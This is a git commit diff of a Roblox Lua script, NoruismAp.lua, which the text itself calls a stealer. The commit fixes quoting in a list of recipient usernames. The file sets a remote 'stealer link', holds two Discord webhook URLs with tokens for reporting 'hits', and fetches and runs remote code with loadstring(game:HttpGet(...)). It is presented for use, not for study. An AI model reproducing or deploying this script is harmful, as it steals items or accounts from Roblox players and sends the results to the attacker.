ebc2a0c2bc5796934677dd13f8df2b9043f3b374
mijikaisys <mikifemboy@gmail.com>
2025-03-25 00:40:15 +0100

    Update NoruismAp.lua

--- NoruismAp.lua
+++ NoruismAp.lua
@@ -1,13 +1,12 @@
 STEALER_LINK = 'https://dpaste.com/8NYBZ373K.txt' -- stealer link (how to create is bellow)
 
 Usernames = {
-    'Asuna_0nO, -- PUT UR ROBLOX USERNAMES
-    'drpon63, -- AS MANY AS U WANT BUT DONT FORGET ,
-    'Kiddo_2014,
+    'Asuna_0nO', -- PUT UR ROBLOX USERNAMES
+    'drpon63', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'Kiddo_2014',
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/1353867935239766096/enQqQC8BA28ZS6bBgbqtR6GAnSqIK7r5757MHiRyYuFhE8CZHsT9h_2Uzai2zsTNlCZK"
 SmallHitsWebhook = "https://discord.com/api/webhooks/1353868208146219128/BNoTNWtdeXda09fcPnoMyi9zk0T8EQybCXCLNiFxbkXsTYrC3CkCJvrg0haXikz89AAr"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
-
